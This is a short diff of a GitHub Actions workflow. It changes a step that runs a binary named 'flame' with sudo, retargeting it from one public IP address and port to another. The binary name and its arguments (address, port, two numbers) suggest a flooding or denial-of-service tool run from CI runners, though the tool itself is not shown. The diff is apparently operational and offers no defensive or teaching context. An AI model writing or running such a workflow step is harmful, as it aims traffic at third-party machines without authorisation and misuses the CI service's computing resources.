@@ -11,4 +11,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x flame
-    - run: sudo ./flame 20.219.167.192 22032 200 999
+    - run: sudo ./flame 52.172.103.71 17516 100 999
